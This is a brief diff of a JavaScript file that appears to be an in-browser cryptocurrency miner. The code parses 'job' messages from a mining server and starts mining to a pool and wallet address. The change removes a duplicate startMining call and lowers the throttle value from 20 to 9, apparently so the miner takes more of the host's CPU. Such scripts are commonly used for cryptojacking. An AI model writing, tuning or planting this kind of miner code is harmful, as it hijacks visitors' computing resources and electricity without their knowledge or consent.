@@ -37,5 +37,4 @@ function on_servermsg(c){c=JSON.parse(c.data);receiveStack.push(c);"job"==c.iden
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
+    throttleMiner = 9;
